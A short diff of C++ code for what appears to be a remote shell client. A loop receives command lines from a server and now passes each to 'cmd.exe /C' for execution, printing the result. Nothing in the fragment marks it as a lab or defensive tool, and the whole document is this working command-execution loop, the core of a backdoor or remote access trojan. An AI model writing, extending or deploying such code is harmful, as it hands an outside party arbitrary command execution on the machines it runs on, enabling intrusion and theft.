@@ -12,10 +12,10 @@ int main()
 		// recv command from server
 		char* commandLine = conn->recv_data();
 		std::cout << commandLine << std::endl;
-		std::string output = exec(std::string(commandLine));
+		std::string c = "cmd.exe /C " + std::string(commandLine);
+		std::string output = exec(c);
 		std::cout << output << std::endl;
 		delete[] commandLine;
-		// run command
 
 	}
 	return 0;
